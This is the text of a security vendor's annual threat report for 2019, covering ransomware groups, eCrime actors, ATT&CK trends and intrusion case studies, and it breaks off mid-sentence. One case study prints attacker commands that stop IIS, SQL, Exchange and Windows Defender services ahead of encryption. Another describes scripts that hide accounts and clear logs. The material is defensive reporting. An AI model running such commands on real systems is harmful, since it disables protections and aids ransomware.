FOREWORD
While criminals are
relatively predictable
in their tendency to
always choose the path
of least resistance, the
activities of nationstates are frequently
more relentless
and sophisticated
— and as a result,
more challenging for
cyberdefenders.

T

hose of us who have worked in cybersecurity for many years often start to think
we’ve “seen it all.” We haven’t. This year’s CrowdStrike® Global Threat Report
provides clear evidence of that.

Consider the dark turn in cybercrime toward preying on schools, municipal
departments and our other chronically understaffed and overburdened public
institutions. This is different from targeting large government entities and corporations,
many of whom have resigned themselves to being targeted by cyber predators and
have the opportunity to try to protect themselves from that onslaught. It’s a different
matter entirely when the targets are schoolchildren, or just ordinary people trying to
go about their daily lives.
This merciless ransomware epidemic will continue, and worsen, as long as the practice
remains lucrative, and relatively easy and risk-free. We’ve developed a platform
designed to stop ransomware for our customers, and we’ve worked hard to make it
easy and affordable — even for budget-constrained institutions like our public school
systems. As more organizations around the world deploy next-generation platforms
like CrowdStrike Falcon® that can prevent these threats, the criminal element will be
forced to redirect its efforts elsewhere.
While criminals are relatively predictable in their tendency to always choose the path
of least resistance, the activities of nation-states are frequently more relentless and
sophisticated — and as a result, more challenging for cyberdefenders. This year’s
threat report uncovers numerous new tactics, techniques and procedures (TTPs)
that state-affiliated threat actors are employing to accomplish their goals. Of concern
here is the widening variety of goals these highly capable adversaries may seek to
achieve. Along with the more traditional objectives of espionage and surveillance have
been added new tasks, such as sowing widespread disruption and discord among
individuals, institutions and even whole countries and populations, all in pursuit of
political and economic gains.
If there’s one thing this year’s Global Threat Report really brings home, it’s that
there’s never been a better time to get involved in cybersecurity. The stakes are high,
and rising every day. Those that read and share this report are helping to educate
themselves and others to better protect themselves and their communities, both at
work and at home.

INTRODUCTION

From U.S. school
districts to asset
management firms,
from manufacturing
to media, ransomware
attacks affected
multitudes of people.
Disruption in 2019
was not punctuated
by a single destructive
wiper; rather, it was
plagued by sustained
operations targeting
the underpinnings of
our society.

A

year in cybersecurity is often marked by how disruptive the activity observed
was — not just from a destructive standpoint, but also from the perspective of
whether day-to-day life was affected. By any such measure, 2019 was an active
year. From U.S. school districts to asset management firms, from manufacturing
to media, ransomware attacks affected multitudes of people. Disruption in 2019 was
not punctuated by a single destructive wiper; rather, it was plagued by sustained
operations targeting the underpinnings of our society. The particularly disruptive
impact that ransomware had across all sectors is addressed at the beginning of this
report, followed by an assessment of additional eCrime threats.
Going into 2019, CrowdStrike Intelligence anticipated that big game hunting (BGH) —
targeted, criminally motivated, enterprise-wide ransomware attacks — was expected
to continue at least at the 2018 pace. However, what was observed was not just
a continuation but an escalation. Ransom demands grew larger. Tactics became
more cutthroat. Established criminal organizations like WIZARD SPIDER expanded
operations, and affiliates of the ransomware-as-a-service (RaaS) malware developers
adopted BGH attacks. In short, the greedy got greedier and the rich got richer.
Other criminal actors took note. Numerous adversaries specializing in the delivery or
development of malware benefited from supporting customers or partners conducting
BGH operations. Malware-as-a-service (MaaS) developers like VENOM SPIDER
introduced ransomware modules. Banking trojans continued to be repurposed for
download-as-a-service (DaaS) operations — a trend started by MUMMY SPIDER
— used to distribute malware families associated with BGH. Even targeted eCrime
appears to be in a state of change, apparent by the recent activity attributed to
GRACEFUL SPIDER, an adversary notable for its high-volume spam campaigns and
limited use of ransomware.
As in years past, the majority of state-sponsored targeted intrusions appeared to
be motivated by traditional intelligence collection needs. Analysis in 2019 revealed
a focus by Chinese adversaries on the telecommunications sector, which could
support both signals intelligence and further upstream targeting. Content related to

defense, military and government organizations remains a popular lure for targeted
intrusion campaigns. Examples of such incidents were seen in the activity of Russian
adversaries targeting Ukraine, and the use of defense-themed job and recruitment
content by Iran-based IMPERIAL KITTEN and REFINED KITTEN.
While traditional espionage is the primary objective of many state-sponsored actors,
adversaries associated with the Democratic People’s Republic of Korea (DPRK,
aka North Korea) sustained their interest in cryptocurrencies and the targeting of
financial services, with identified incidents linked to all five named DPRK-associated
adversaries tracked by CrowdStrike. Exact motives remain unconfirmed, but it is
possible this interest in financial sector organizations represents additional currency
generation operations and/or industrial espionage. Industrial espionage is also a
suspected motive for Vietnam’s targeting of the automotive sector and China’s
targeting of healthcare and other sectors, bringing the threat of intellectual property
theft back into the spotlight.
In the following sections, the CrowdStrike Intelligence team, the Falcon OverWatch™
managed threat hunting team and the CrowdStrike Services team present selected
analysis that highlights the most significant events and trends in the past year of
cyber threat activity. This analysis demonstrates how threat intelligence and proactive
hunting can provide a deeper understanding of the motives, objectives and activities
of these actors — information that can empower swift proactive countermeasures to
better defend your valuable data now and in the future.

THREAT LANDSCAPE OVERVIEW:
TAKING A STEP BACK FOR PERSPECTIVE
Before examining tactics and techniques observed from individual adversaries,
it’s instructive to take a broad view of the threat landscape and how it continues
to shift over time. One useful lens is comparing the types of attacks that leverage
malware and those that do not. For the purposes of this report, these terms will be
defined as follows:
	
Malware attacks: These are simple use cases where a malicious file is written to
disk, and CrowdStrike Falcon detects the attempt to run that file and then identifies
and/or blocks it. These intrusion attempts are comparatively simple to intercept and
block and can often be stopped effectively with traditional anti-malware solutions.
	
Malware-free attacks: CrowdStrike defines malware-free attacks as those in which
the initial tactic did not result in a file or file fragment being written to disk. Examples
include attacks where code executes from memory or where stolen credentials
are leveraged for remote logins using known tools. Malware-free attacks generally
require a wide range of more sophisticated detection techniques to identify and
intercept reliably, including behavioral detection and human threat hunting.
Figure 1 compares malware and malware-free attacks from the 2019 CrowdStrike
Threat Graph telemetry.

These new data points highlight a continuing trend in attack techniques, which are
reflected throughout this report. For the last two years, Threat Graph telemetry has
shown that approximately 60% of attacks were malware-related. The 2019 Threat
Graph telemetry shows that the trend toward malware-free attacks is accelerating
with these types of attacks surpassing the volume of malware attacks.

malware-free attacks, whereas 2019 showed a major jump in malware-free attacks
targeting North America and a similarly large decrease in malware-free attacks
targeting the Latin America region.

CROWDSTRIKE GLOBAL THREAT REPORT 2020

BREAKOUT TIME
In the 2018 Global Threat Report, CrowdStrike began reporting on "breakout time."
This key cybersecurity metric measures the speed from an adversary's initial
intrusion into an environment, to when they achieve lateral movement across the
victim's network toward their ultimate objective. Breakout time is important for
defenders, as it sets up the parameters of the continuous race between attackers
and defenders. By responding within the breakout time window, which is measured
in hours, defenders are able to minimize the cost incurred and damage done by
attackers. CrowdStrike continues to encourage security teams to strive to meet the
metrics of the 1-10-60 rule: detecting threats within the first minute, understanding
threats within 10 minutes, and responding within 60 minutes.
This year, the average breakout time for all observed intrusions rose from an
average of 4 hours 37 minutes in 2018 to 9 hours in 2019. This increase reflects the
dramatic rise in observed eCrime attacks, which tend to have significantly longer
breakout times compared with nation-state adversaries. It’s important to note that
defenders should still focus on speed, as data attributable to nation-state activities
in 2019 does not suggest any major changes in breakout times among stateaffiliated adversaries this year compared to last year.

Breakout time is important for defenders, as it sets
up the parameters of the continuous race between
attackers and defenders. By responding within the
breakout time window, which is measured in hours,
defenders are able to minimize the cost incurred and
damage done by attackers.

GLOBAL ATT&CK TECHNIQUE TRENDS
Moving past the initial intrusion vector, attackers employed a wide range of tactics
and techniques in order to achieve their goal, whether that goal was financial gain,
political advantage or disruption of services. The MITRE ATT&CK™ framework
provides a very useful taxonomy of attackers’ TTPs that we can use to catalog
observed behaviors in order to better understand methods in common use and how
those methods have changed over time.
The MITRE ATT&CK framework is an ambitious initiative that is working to bring
clarity to how the industry talks about cyberattacks. It breaks intrusions into a
series of 12 tactics that adversaries may employ, each with a number of different
techniques that have been observed to be in use.
The following section delves into the types of techniques CrowdStrike observed in
its 2019 telemetry and maps them to the ATT&CK framework.

A notable change in the most prevalent overall techniques used by attackers in
2019 was the significant increase in the use of “masquerading.” This uptick can
be explained by a rise in the use of the EternalBlue exploit in the wild. This is not
necessarily indicative of a particular trend but instead highlights that this is still an
active exploit in use by threat actors. For an example of masquerading in action, see
the section titled “OverWatch Feature: Targeted RaaS Intrusion Involving REvil” below.
The remaining techniques mirror those observed in previous years, with heavy
reliance on hands-on-keyboard techniques (command-line interface, PowerShell) as
well as theft of credentials (credential dumping, valid accounts, account discovery)
and defense evasion (masquerading, hidden files and directories, process injection).
These techniques feature prominently in many sophisticated attacks, where a human
adversary is engaged in the intrusion and is actively working toward an objective.

TECHNIQUE SPOTLIGHT_
Masquerading occurs when the name or location
of an executable, whether legitimate or malicious,
is manipulated or abused for the sake of evading
defenses and observation.

MITRE ATT&CK TECHNIQUES
OBSERVED BY OVERWATCH
When the Falcon OverWatch team analyzes a targeted eCrime or state-sponsored
intrusion campaign, it uses the MITRE ATT&CK matrix as a framework to
categorize adversary behavior. The following chart is a heat map of the adversary
tactics and techniques OverWatch identified while analyzing targeted eCrime and
state-sponsored intrusions in 2019. OverWatch hunters reviewed telemetry from
all targeted intrusions uncovered by their threat hunting operations to ensure
accurate identification of the adversary techniques employed.

THE RICH KEEP GETTING RICHER:
THE PERVASIVE RANSOMWARE THREAT
In 2019, BGH, another term for enterprise-scale ransomware operations, was the most
lucrative enterprise for eCrime adversaries. Ransom demands soared into the millions
(see Table 1), causing unparalleled disruption.
CrowdStrike Intelligence observed the increasing sophistication of BGH criminal
organizations attributed to WIZARD SPIDER and INDRIK SPIDER. The latter group
splintered to form a new BGH adversary, DOPPEL SPIDER. All of these adversaries
are well established in the criminal ecosystem. WIZARD SPIDER and INDRIK SPIDER
operated profitable banking trojans before turning to ransomware to rapidly monetize
their compromise of business and government networks.
Ransomware-as-a-service (RaaS)1 developer PINCHY SPIDER, which takes a cut of
the profits from its affiliates, began encouraging partners to adopt BGH practices
in February 2019. Following a pseudo-retirement — in which PINCHY SPIDER and
its partners switched from GandCrab to REvil — their use of BGH TTPs became
increasingly apparent. The RaaS model of monetization and BGH tactics were also
adopted by the developers of the Dharma and Nemty ransomware families. Suspected
BGH and/or RaaS operations include the RobbinHood, LockerGoga, MegaCortex and
Maze ransomware families. While LockerGoga was only briefly active in 2019, recent
infections were reported for the other three in November and December 2019.

Although ransomware was widespread in 2019 and affected all sectors, CrowdStrike
Intelligence identified several trends in the targeting of specific sectors, and in the
impacts observed from these targeted operations.

Known
Ransomware

Details

RobbinHood,
Ryuk, REvil,
DoppelPaymer

The targeting of municipalities and local
governments was popular among BGH criminal
operators beginning in Spring 2019 and continuing
through the rest of the year. Targets included several
U.S. states and cities, and multiple incidents were
seen in Spain.

Ryuk

An extension of local government targeting was
first observed in Summer 2019: an outbreak of
ransomware infections targeting public school
systems in the U.S. This trend intensified in September
2019 during the back-to-school period and continued
intermittently through the end of the year.

BitPaymer,
REvil, Ryuk

An alarming trend in targeted ransomware
operations is the compromise of managed service
providers (MSPs). Subsequent use of remote
management software can enable the spread of
ransomware to many companies from a single point
of entry. WIZARD SPIDER also targeted this sector
and impacted cloud service providers.

Healthcare

Ryuk, REvil

A string of targeted healthcare attacks in the U.S.,
Canada and Australia from late September to early
October was linked to WIZARD SPIDER. A PINCHY
SPIDER affiliate also claimed a victim in this sector by
first breaching an MSP, demonstrating how third parties
can be vulnerable to these attacks.

Manufacturing

BitPaymer,
Ryuk,
LockerGoga,
DoppelPaymer

Although the targeting of the manufacturing sector
appeared to be intermittent, the known intrusions
include energy and chemical companies among
others.

Financial Services

BitPaymer, REvil

INDRIK SPIDER claimed victims in the financial
services sector in mid-2019. PINCHY SPIDER
affiliates successfully impacted a Chinese asset
management firm, demanding a significant ransom,
and used financial themes for distribution.

Media

BitPaymer, Ryuk

INDRIK SPIDER and WIZARD SPIDER claimed
victims in this sector.

BIG GAME HUNTERS
THE MONOLITH: WIZARD SPIDER
In 2019, two lines of analysis came together when CrowdStrike Intelligence
attributed the operation of Ryuk ransomware to WIZARD SPIDER. Previously,
these campaigns were tracked separately under the cryptonym GRIM SPIDER;
however, beginning in March 2019, evidence coalesced behind the conclusion that
Ryuk campaigns were operated by the core group of WIZARD SPIDER, the wellestablished criminal adversary behind the TrickBot banking trojan.
WIZARD SPIDER continues to develop TrickBot, offering customized modules for
close affiliates including LUNAR SPIDER, operator of BokBot. CrowdStrike identified
numerous spam campaigns delivering TrickBot using government or business
themes, further evidence that this adversary aims to compromise large corporations
and organizations. As additional support to TrickBot infections, WIZARD SPIDER
uses Android malware known as AndroStealer to steal SMS messages sent and
received by the device to enable the theft of two-factor authentication (2FA) tokens
and subsequent financial fraud.
Finally, TrickBot modules are used to identify victims of interest for the deployment
of WIZARD SPIDER’s post-exploitation tool, Anchor DNS. Often identified on pointof-sale (PoS) endpoints, this piece of malware could enable WIZARD SPIDER to
conduct financial fraud directly from the victimized systems, without the use of
webinjects available in TrickBot or the deployment of ransomware.
WIZARD SPIDER defies any attempts to categorize its operations, having mastered
multiple forms and variations of criminal enterprise. The sum total of all of its
operations has led to WIZARD SPIDER becoming the most reported adversary of
2019 across all lines of reporting.

THE WANTED: INDRIK SPIDER
INDRIK SPIDER’s BitPaymer operations continued at pace throughout 2019, and
CrowdStrike Intelligence also observed the intermittent distribution of Dridex, the
group’s banking trojan. Then, on December 5, 2019, the U.S. Department of Justice
(DOJ) unsealed an indictment of two Russian individuals — Maksim Viktorovich
Yakubets and Igor Turashev — for their involvement with Bugat malware, which is the
predecessor of Dridex. Since neither the U.S. nor the U.K. have an extradition treaty
with Russia, it is unlikely these individuals will be immediately arrested. However,
CrowdStrike Intelligence continues to monitor for activity from both Dridex and
BitPaymer ransomware to identify any possible impact on INDRIK SPIDER, as well as
the splinter group DOPPEL SPIDER.

THE DOPPELGANGER: DOPPEL SPIDER
In June 2019, CrowdStrike Intelligence observed a source code fork of BitPaymer
and began tracking the new ransomware strain as DoppelPaymer. Further technical
analysis revealed an increasing divergence between two versions of Dridex, with the
new version dubbed DoppelDridex. Based on this evidence, CrowdStrike Intelligence
assessed with high confidence that a new group split off from INDRIK SPIDER
to form the adversary DOPPEL SPIDER. Following DOPPEL SPIDER’s inception,
CrowdStrike Intelligence observed multiple BGH incidents attributed to the group,
with the largest known ransomware demand being 250 BTC. Other demands were
not nearly as high, suggesting that the group conducts network reconnaissance to
determine the value of the victim organization.

RAAS OPERATIONS
MOVE TOWARD BIG GAME HUNTING
THE PIONEER: PINCHY SPIDER
Ransom demands
in REvil operations,
compared to PINCHY
SPIDER’s former
GandCrab operations,
have been significantly
larger; one of the
largest REvil demands
identified was for $10
million USD.

First observed in 2018, PINCHY SPIDER pioneered the RaaS model of operations, in
which the developer receives a share of the profits that affiliates collect from successful
ransomware infections. Beginning in February 2019, this adversary advertised its
intention to partner with individuals skilled in RDP/VNC networks and with spammers
who have experience in corporate networking. Combined with observed hands-on
activity by affiliates that resulted in the installation of GandCrab ransomware, this
indicated a clear intention by PINCHY SPIDER to move toward BGH operations.
In May 2019, PINCHY SPIDER announced its retirement from GandCrab operations.
This development coincided with the rise of REvil ransomware (aka Sodinokibi).
Analysis of code overlaps and distribution methods for these two ransomware families
led to the determination that PINCHY SPIDER had not retired but was operating
and developing REvil. The decision to announce the retirement of GandCrab on
forums was possibly due to the public scrutiny and popularity that the operation was
attracting, which likely included interest by international law enforcement agencies.
Using REvil, PINCHY SPIDER and its affiliates began BGH operations in earnest.
Ransom demands in REvil operations, compared to PINCHY SPIDER’s former
GandCrab operations, have been significantly larger; one of the largest REvil demands
identified was for $10 million USD. CrowdStrike Intelligence has continued to track
REvil samples and associated affiliate numbers since mid-2019. As of December
2019, a total of 699 unique samples of REvil have been identified, as well as 39 unique
affiliate IDs (see Figure 5).

OVERWATCH FEATURE_

TARGETED RAAS
INTRUSION INVOLVING REVIL
Overview
In October 2019, OverWatch identified an eCrime intrusion and observed
malicious activity reflective of an early-stage hands-on ransomware attack.
It involved the retrieval and deployment of multiple actor tools, including a
malicious binary identified by CrowdStrike Intelligence as REvil.

Initial Observations
The initial intrusion vector was likely a password-spraying attack against
Remote Desktop Protocol (RDP) and Server Message Block (SMB) services
exposed to the internet, allowing the unidentified actor to obtain the necessary
credentials to access the network and carry out its actions on objectives.
OverWatch identified a high volume of failed RDP logon events across multiple
user accounts in activity reflective of password spraying, a technique used as an
alternative to brute forcing where an actor will perform logon attempts against
multiple user accounts using a list of commonly used passwords. OverWatch
often observes this technique prior to targeted ransomware attacks.
The actor appeared to target both RDP and SMB services on a public-facing
host and was ultimately able to successfully guess an account password,
enabling them to interactively log on to the system, drop tools and execute
custom scripts. The password-spraying technique is often preferred over brute
forcing as it mitigates the possibility of account lockouts that typically occur
when an actor performs multiple failed logon attempts against a single account.

Notable Adversary Behavior
In preparation for the intended execution of the REvil ransomware binary, the
adversary dropped custom .bat scripts, which upon execution launched
multiple net stop and taskkill commands to stop a number of critical
services on the host system associated with Microsoft Internet Information

20

CROWDSTRIKE GLOBAL THREAT REPORT 2020

21

OVERWATCH FEATURE_
Services (IIS), Microsoft SQL Server and Microsoft Exchange.
net stop IISADMIN
net stop SQLBrowser
net stop MSExchangeSA
taskkill /f /im mysql*
Presumably, these services are stopped in order to unlock their data files to be
encrypted. Notably, two additional batch files were also written to the host but
were not executed. Further analysis of the files suggested that the execution of
these scripts would likely have inhibited system recovery via the deletion of volume
shadow copies, as well as the deletion of system or security logs as a means of
removing indicators from the host.
Additionally, the actor was also observed using the net command to stop the
Windows Defender service.
net stop WinDefend
The actor wrote the REvil binary to the \Documents directory on the host:
C:\Users\user\Documents\[REDACTED]\svhost.exe (sic)
However, the adversary was not able to execute the file before the intrusion was
stopped. Interestingly, the binary appeared to be masquerading as the Windows
Shared Service Host process in a further attempt to evade detection.

Conclusions and Recommendations
The actor’s use of “living off the land” (LOTL) techniques reinforces the importance
of having humans continuously hunting across a network in order to enable rapid
response to quickly developing threat activity. The deployment of the CrowdStrike
Falcon agent, complemented with the OverWatch managed threat hunting service,
allowed for the prompt identification of actor tradecraft and the subsequent
containment and response.
To defend against password spraying, the use of strong account management — in
conjunction with effective account lockout policies following a defined number of
failed login attempts and the use of complex passwords — can assist in preventing
passwords from being guessed. In addition, ensure that RDP services are
appropriately locked down and avoid leaving them exposed to the internet.

RDP-ENABLED
DHARMA RANSOMWARE ACTIVITY
Overview
CrowdStrike observed numerous attempts by criminal actors to gain access to
victim hosts over RDP in order to install RaaS malware families — primarily Dharma,
but in at least one case, REvil. The target scope for these incidents is worldwide,
and they have varied in size from small businesses to Fortune 500 conglomerates.
CrowdStrike has observed incidents targeting entities in the academic, government,
healthcare, hospitality, technology, energy, financial services and manufacturing
sectors. These attacks are consistent with a move by eCrime adversaries toward
BGH operations and represent a specific trend observed throughout 2019 of RaaS
affiliates attempting enterprise ransomware operations.
OverWatch observed an example of such a BGH intrusion in early April 2019
against a large network. The threat actor attempted to deploy ransomware
known as Dharma; however, Falcon successfully blocked its execution.
CrowdStrike Intelligence observed that Dharma has been in use since 2016
as a direct result of the evolution of the Crysis ransomware. The ransomware
is highly configurable and operates on an affiliate-based system. Typically for
these intrusions, as is the case for many other BGH attacks, the threat actors
gain access to the systems by exploiting vulnerable machines, or they bruteforce passwords for machines with weak or predictable RDP credentials.

Initial Observations
OverWatch identified initial interactive behavior when the adversary executed
a collection of malicious scripts under the Local Administrator account. These
scripts automated the configuration changes to the system that enabled
persistent remote access, attempted to execute Dharma ransomware and
removed operating system logs.

22

CROWDSTRIKE GLOBAL THREAT REPORT 2020

OVERWATCH FEATURE_
Notable Adversary Behavior
The initial script executed, named Zzz.bat, kicked off the execution of the following tasks:
	Assigned new password for local accounts
	Queried the operating system for users in Local Administrator and Remote
Access groups
	Manipulated accounts and user group settings
	Added new user accounts
	Manipulated file system permissions to hide newly added accounts
	
Modified registry settings for remote access, disabling connection duration
timeout limitations
	
Hid newly added accounts from the initial logon screen view
	Created the directory System64Q.dll with additional tools start.cmd, Loog.bat,
rdpclip.exe (renamed NSSM Service Manager) and payload.exe (Dharma)
	Executed the start.cmd script, which created a new service called
WindowsSystem set to execute ransomware payload
	Executed the Loog.bat script, which cleared operating system event logs

Shortly after, the newly created service WindowsSystem attempted to execute
the Dharma ransomware payload; however, the activity was blocked by Falcon.
In response, the threat actor downloaded the Process Hacker tool and actively
debugged further failed attempts to execute ransomware. After inspecting the
operating system behavior, the threat actor elevated privileges to target installed
security software and attempted to disable native operating system features.

Conclusions and Recommendations
The adversary was ultimately unsuccessful in its attack, thanks to the combination
of Falcon telemetry and OverWatch threat hunting. Nevertheless, this intrusion
emphasizes the need for successful prevention, rapid detection and timely response
capabilities. OverWatch recommends that customers:
	Review current remote access points and ensure that logging is enabled and retained,
and that access is monitored and restricted to necessary resources only.
	Implement multifactor authentication for all external remote access points, external
applications and sensitive internal applications within the environment to mitigate the
risk of unauthorized access via valid credentials/weak passwords.
	
Perform regular scanning for and emergency patching of high-priority vulnerabilities.
	
Define a set of emergency procedures that enables security teams to invoke operations
such as host containment, firewall change requests or revocation of account privileges.

LOOKING FORWARD
In September 2019, CrowdStrike Intelligence detected and analyzed a previously
unidentified data exfiltration tool attributed to WIZARD SPIDER, dubbed Sidoh.
The functionality of this malware includes the ability to search for keywords within
files, including words related to sensitive information. The nature of these keywords
suggests that the adversary could collect data in order to threaten the release of
sensitive information if ransoms are not paid (i.e., data extortion) or to sell data to
other adversaries (an additional method of monetization).
Although the exact use of Sidoh has not been determined, the list of strings the
tool uses to select data for exfiltration includes words such as military, secret,
clandestine and government, raising the question of whether WIZARD SPIDER is
supporting government espionage. Interestingly, along with the DOJ indictment of
INDRIK SPIDER, the U.S. Department of the Treasury’s Office of Foreign Assets
Control (OFAC) announced sanctions, noting that Yakubets has maintained links to
and worked for the Russian Federal Security Service (FSB) since 2017. This activity
includes items such as "acquiring confidential documents through cyber-enabled
means and conducting cyber-enabled operations on its behalf.” In 2018, Yakubets
began a process to obtain a license to work on Russian classified information for the
FSB, which provides further weight to historical evidence of Russia-based eCrime
actors enabling state activities.
The increasing threat of data extortion as an alternative method of monetization was
observed at the end of 2019, with operators of both REvil and Maze ransomware
threatening to leak data, and in some cases following through, if ransoms were
not paid. Given these observations, it is possible that data extortion will be used
increasingly by these actors to apply additional pressure on victims who don’t pay
and instead choose to restore their networks using backup copies of the data.

ECRIME TRENDS AND ACTIVITY
In addition to high-volume ransomware attacks, CrowdStrike Intelligence continued
to track numerous eCrime threats, including banking trojans, spambots, Business
Email Compromise (BEC) scams, targeted eCrime operations, carding shops and
malware-as-a-service (MaaS) developers. This section covers notable trends in the
cybercriminal ecosystem, including observed trends in TTPs and targeting.
The following figures provide a visual summary of the activity that CrowdStrike
Intelligence reported on in 2019. Figures 6 and 7 provide a clear indication of the
level of threat ransomware poses. Of all eCrime threats, ransomware represented
26% of what was reported in 2019. The number climbs to 37% of threats when
ransomware reports are combined with reports of banking trojan malware operated
by BGH adversaries (e.g., TrickBot).
Of note, one of the most reported ransomware threats was GandCrab, which is not
listed as a top threat in Figure 6. This malware is now inactive and was replaced
operationally by REvil. The combined number of GandCrab and REvil incidents led to
PINCHY SPIDER being the second most reported eCrime adversary in 2019. After
PINCHY SPIDER and operators of Dharma targeted ransomware operations, the
BGH adversaries WIZARD SPIDER, INDRIK SPIDER and DOPPEL SPIDER together
represent a third of reported eCrime, with WIZARD SPIDER alone making up a
quarter of the total.

2019 TRENDS IN TACTICS,
TECHNIQUES AND PROCEDURES
TERMINATING SECURITY PRODUCTS
Notably, one of the
improvements to
BitPaymer that DOPPEL
SPIDER introduced
was the bundling of
ProcessHacker within
DoppelPaymer to kill
blacklisted processes.

Across multiple ransomware cases, CrowdStrike observed perpetrators consistently
attempting to terminate security software, such as endpoint protection products or
security information and event management (SIEM) alert forwarders. Ransomware
operators — including Dharma and Phobos affiliates — have primarily used two
publicly available utilities for this purpose: PCHunter and ProcessHacker. Notably,
one of the improvements to BitPaymer that DOPPEL SPIDER introduced was the
bundling of ProcessHacker within DoppelPaymer to kill blacklisted processes. These
powerful utilities allow actors to not only view and terminate processes, but also
directly interface with the Windows kernel itself. Other free utilities for terminating
security software include PowerTool x64, GMER, Total Uninstall Portable and
Defender Control.

DNS TUNNELING
The use of the DNS protocol for command-and-control (C2) communications is a
useful tactic in the event that other common internet protocols are disabled or closely
inspected in a corporate environment. Although this is not a new technique, CrowdStrike
Intelligence identified some significant examples of adversaries adopting this TTP.
In September 2019, CARBON SPIDER began using a variant of its first-stage Harpy
backdoor that is capable of using DNS as a backup channel for C2 if HTTP fails.

USE OF COMPROMISED SITES HOSTING WORDPRESS CMS
In Q3 2019, CrowdStrike Intelligence noted an overall increase in criminal actors
using compromised websites hosting individual instances of the WordPress
content management system (CMS). In many cases, these sites were used to
deliver malware, including REvil, MUMMY SPIDER’s Emotet, and QakBot. Sites
compromised in this fashion have also been implicated in possible credential
harvesting operations. On Sept. 25, 2019, CrowdStrike Intelligence identified
several malicious phishing pages designed to impersonate a Microsoft Office 365
landing page. The majority of these pages were hosted on legitimate domains likely
compromised through vulnerabilities in CMS plugins.

DROPPER DOCUMENT BUILDERS AND DISTRIBUTION
SERVICES
In October 2019,
CrowdStrike
Intelligence identified
multiple Emotet spam
campaigns conducted
by MUMMY SPIDER
using a technique
referred to as email
thread hijacking.

In 2019, CrowdStrike Intelligence tracked the development of numerous dropper
document families, given the names Gemini, Leo and Virgo. These were most
notably used by COBALT SPIDER but were not exclusive to this adversary. COBALT
SPIDER’s use of Leo documents featured theme and code overlap with a CARBON
SPIDER Harpy campaign. Analysis from late 2019 revealed that Virgo documents
were widespread and linked to the use of numerous information stealers, including
FormBook, Pony and LokiBot.
From July to September 2019, CrowdStrike Intelligence noted an increase in the use
of a document family called TandemDrop. These malicious, macro-enabled documents
are capable of distributing multiple malware variants from a single document.
Observed pairings delivered by TandemDrop documents include:
	Gozi ISFB and REvil
	TrickBot and Gozi ISFB
	Vidar Stealer and Gozi ISFB
	Predator the Thief Stealer and an unconfirmed payload
TandemDrop has also been used to deliver a single malware family. One such
campaign distributed MUMMY SPIDER’s Emotet malware in September 2019.

EMAIL THREAD HIJACKING
In October 2019, CrowdStrike Intelligence identified multiple Emotet spam campaigns
conducted by MUMMY SPIDER using a technique referred to as email thread
hijacking. Email thread hijacking exploits email content previously collected by
Emotet’s email harvester module. After a victim’s email content has been stolen,
MUMMY SPIDER identifies email threads by the subject line (e.g., Re:) and formulates
a reply to the thread. This tactic increases the likelihood that a recipient will open a
malicious attachment (or click a link) because the sender appears to be someone that
they previously communicated with, and the subject line matches a prior conversation
thread that they had with that person. Given that BGH actors WIZARD SPIDER,
INDRIK SPIDER and DOPPEL SPIDER are all customers of MUMMY SPIDER, Emotet
campaigns leading to the compromise of enterprise networks may support targeted
ransomware operations.

ECRIME ENABLERS
CrowdStrike Intelligence tracks enablers as adversaries that specialize in the
delivery or development of malware. Developers monetize their malware-as-aservice (MaaS) operations through the sale and/or rental of malware. Distributors
fall into two categories: operators of spambots and operators of download services.
Existing between these two categories are adversaries that develop criminal
loaders. An example of this operational model is SMOKY SPIDER, which develops
the criminal loader known as Smoke Bot, which is sold on underground forums and
has been observed supporting the distribution of numerous malware families.

ECRIME ADVERSARIES
Download-as-a-service (DaaS) operations began a transformation in 2017 when
MUMMY SPIDER shifted the operation of Emotet from a banking trojan to a
distribution service. In 2019, further evidence of what has been observed since then
suggests that LUNAR SPIDER (operator of BokBot) and SCULLY SPIDER (operator
of DanaBot) are making similar moves away from banking trojan operations and
toward download services supporting the distribution of third-party malware.
The success of these adversaries has not been matched by other actors. Spambots
continued to decline in 2019, with MONTY SPIDER’s CraP2P spambot falling silent
in April. NARWHAL SPIDER’s operation of Cutwail v2 was limited to country-specific
spam campaigns, although late in 2019 there appeared to be an effort to expand by
bringing in INDRIK SPIDER as a customer.

VENOM SPIDER: A MAAS OPERATIONAL MODEL
VENOM SPIDER is the developer of a large toolset that includes SKID, VenomKit
and Taurus Loader. Under the moniker “badbullzvenom,” the adversary has been
an active member of Russian underground forums since at least 2012, specializing
in the identification of vulnerabilities and the subsequent development of tools for
exploitation, as well as for gaining and maintaining access to victim machines and
carding services. Recent advertisements for the malware indicate that VENOM
SPIDER limits the sale and use of its tools, selling modules only to trusted affiliates.
This preference can be seen in the fact that adversaries observed using the tools
include the targeted criminal adversary COBALT SPIDER and BGH adversaries
WIZARD SPIDER and PINCHY SPIDER (see Figure 9).

Tool

Description

Taurus Loader

Taurus Loader is a document builder that creates malicious VBA
MS Word documents that download an additional JavaScript
scriptlet containing a DLL file. VENOM SPIDER has developed
several modules for Taurus Loader; these include a Stealer
Module, a TeamViewer Module, a Reconnaissance Module and a
Ransomware Module.

SKID

SKID is a JavaScript backdoor also known as More_Eggs. On July
10, 2019, VENOM SPIDER advertised SKID on underground forums
for $3,500 USD and stated that the loader is used for targeted
attacks only.

VenomKit

VenomKit is an exploit document builder that supports delivery
of executable, DLL or PowerShell script payloads along with an
additional MS Word file that acts as a decoy and includes text or
images to enhance social engineering.

LOOKING FORWARD
Following a summer hiatus, MUMMY SPIDER Emotet campaigns exhibited an extremely
broad geographic scope, suggesting the adversary continues to expand its operations.
The use of email thread hijacking, an insidious tactic designed to exploit human
interactions, is the latest improvement the actor has made to support its customers.
CrowdStrike Intelligence expects the use of this tactic to continue into 2020 and
anticipates MUMMY SPIDER will continue to make developments that ensure the scale
of Emotet infections will attract criminal actors of every level of sophistication.
The effort by all of the distributors — even the flagging spambots — to enable BGH
adversaries like WIZARD SPIDER speaks to the enormous ripple effect that targeted
ransomware has made in the criminal ecosystem. Even MaaS vendors have found
themselves assembling and offering ransomware modules to go with their suite of
tools, in an effort to skim a profit from the desires of less sophisticated but eager
actors. It remains to be seen if these endeavors will provide lasting security for
these operations. The future — and the largest cut of profits — seems destined
to belong to those actors that have been able to master multiple methods of
monetizing their skills and tools.
Still, MaaS developers may prefer to stay out of the limelight, as suggested by VENOM
SPIDER’s judicious cherry-picking of customers. Pleasing a few selected operators
carries less risk than hands-on-keyboard activity within a victim’s network, as well as
arguably aiding in protecting the developer’s operational security.

TARGETED ECRIME ACTIVITY
Historically, CrowdStrike Intelligence has tracked a subset of eCrime adversaries
that are conducting wire fraud and/or compromising point-of-sale (PoS) systems at
